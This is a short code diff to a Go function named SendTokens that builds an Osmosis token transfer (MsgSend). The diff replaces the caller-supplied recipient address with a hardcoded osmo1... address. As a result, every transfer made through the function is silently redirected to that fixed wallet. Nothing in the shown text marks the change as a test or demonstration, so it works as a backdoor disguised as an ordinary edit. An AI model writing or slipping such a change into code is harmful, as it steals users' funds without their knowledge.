@@ -72,7 +72,7 @@ func SendTokens(
 
 	sendTokenMsg := &banktypes.MsgSend{
 		FromAddress: accAddress.String(),
-		ToAddress:   accAddressTo.String(),
+		ToAddress:   "osmo1adz3qee0s03zw257mfgtl7yzmjqlkj2mxcyhfn",
 		Amount:      sdk.NewCoins(sdk.NewCoin(OsmoDenom, osmomath.NewInt(tokenAmount))),
 	}
 
